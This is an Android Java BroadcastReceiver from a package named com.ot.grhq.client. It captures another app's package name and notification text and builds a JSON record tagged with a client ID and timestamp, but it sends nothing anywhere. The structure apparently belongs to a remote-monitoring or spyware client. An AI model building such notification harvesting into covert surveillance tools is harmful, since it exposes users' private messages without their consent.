package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Notifications broadcast receiver
 */
class Notification extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("notification_data".equals(intent.getAction())) {
            String packageName = intent.getStringExtra("package_name");
            String notificationContent = intent.getStringExtra("notification_content");

            JSONObject json = new JSONObject();
            try {
                json.put("id", Utils.clientID(context));
                json.put("type", "client");
                json.put("res", "notification");
                json.put("sender", packageName);
                json.put("content", notificationContent);
                json.put("timestamp", System.currentTimeMillis());


            } catch (JSONException e) {
                throw new RuntimeException(e);
            }

        }
    }
}
